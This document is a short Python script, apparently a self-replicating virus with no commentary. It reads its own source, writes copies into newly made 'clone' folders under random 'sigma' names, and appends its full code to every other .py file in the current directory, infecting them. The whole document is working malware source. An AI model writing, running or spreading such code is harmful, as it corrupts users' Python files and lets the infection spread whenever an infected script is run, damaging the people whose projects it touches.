import os
import random

File = open(__file__, 'r')
Data = File.read()
File.close()


def generator():
    file_name = 'sigma'
    characters = 'abcdef'
    length = random.randint(1,5)
    for i in range(length):
        file_name += random.choice(characters)
    return file_name

def duplicate(name, folder):
    try:
        os.mkdir(folder)
        os.chdir(folder)
        File = open(name, 'w')
        File.write(Data)
        File.close()
        os.chdir("..")
    except Exception as Error:
        folder = folder + "0"
        duplicate(name, folder)
for i in range(5):
    Name = generator()
    duplicate(Name, "clone")

files = list()
for file in os.listdir():
    if file.endswith('.py'):
        files.append(file)

files.remove(__file__)

# insertion of code into other .py files
for File in files:
    Obj = open(File, 'a')
    Obj.write(Data)
    Obj.close()

